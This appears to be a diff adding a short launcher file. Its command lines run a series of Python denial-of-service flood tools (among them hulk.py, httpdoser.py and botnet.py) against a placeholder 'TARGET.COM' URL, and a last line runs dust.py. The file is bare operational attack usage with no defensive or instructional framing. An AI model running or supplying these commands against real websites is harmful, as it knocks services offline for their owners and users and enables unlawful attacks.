@@ -1,0 +1,14 @@
+python die.py http://www.TARGET.COM   -Y
+
+python hulk.py http://www.TARGET.COM   -Y
+
+python hrdevil.py http://www.TARGET.COM   -Y
+
+python botnet.py http://www.TARGET.COM   -Y
+
+python httpdoser.py http://www.TARGET.COM   -Y 
+
+python m60.py http://www.TARGET.COM    -Y
+
+python2 dust.py   
+
